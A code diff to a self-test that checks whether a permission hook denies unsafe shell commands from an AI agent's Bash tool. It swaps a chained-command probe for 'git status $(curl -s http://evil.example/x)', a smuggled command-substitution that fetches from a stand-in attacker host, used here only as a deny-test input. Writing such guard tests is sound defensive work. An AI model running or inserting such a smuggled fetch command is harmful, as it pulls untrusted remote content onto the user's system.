@@ -1095,11 +1095,15 @@ async function guardSelfTestProbe() {
   });
   const decisionOf = (r) => r?.decision?.hookSpecificOutput?.permissionDecision;
 
-  const bad = await probe({ tool_name: "Bash", tool_input: { command: "git status; echo PWNED" } });
+  // The probe must be a construct the policy can never allow, not merely a
+  // program that is absent today: a `git status; curl x` probe would start
+  // passing if curl were ever added to the policy, while command substitution
+  // is refused structurally, whatever the program list says.
+  const bad = await probe({ tool_name: "Bash", tool_input: { command: "git status $(curl -s http://evil.example/x)" } });
   if (decisionOf(bad) !== "deny") {
     return {
       ok: false,
-      reason: `the hook did not deny a chained command (exit ${bad.code ?? "?"}${bad.error ? `, spawn error ${bad.error}` : ""})`,
+      reason: `the hook did not deny a command-substitution probe (exit ${bad.code ?? "?"}${bad.error ? `, spawn error ${bad.error}` : ""})`,
     };
   }
   const good = await probe({ tool_name: "Bash", tool_input: { command: "git status" } });
@@ -1112,7 +1116,7 @@ async function guardSelfTestProbe() {
   // Same deny probe, but through the shell-rendered command line — the path the
   // CLI actually takes. On Windows this is `cmd /d /s /c` on the quoted string,
   // on unix `/bin/sh -c`; if quoting cannot survive it, the guard is not real.
-  const shelled = await probe({ tool_name: "Bash", tool_input: { command: "git status; echo PWNED" } }, "shell");
+  const shelled = await probe({ tool_name: "Bash", tool_input: { command: "git status $(curl -s http://evil.example/x)" } }, "shell");
   if (decisionOf(shelled) !== "deny") {
     return {
       ok: false,
@@ -1120,7 +1124,7 @@ async function guardSelfTestProbe() {
         `check guardHookCommand() quoting for node at ${process.execPath} and the hook at ${HOOK_SCRIPT}`,
     };
   }
-  return { ok: true, reason: "verified: chained commands are denied (direct and via the shell-rendered command), clean ones allowed" };
+  return { ok: true, reason: "verified: an unsafe command is denied (direct and via the shell-rendered command), a clean one allowed" };
 }
 
 /**
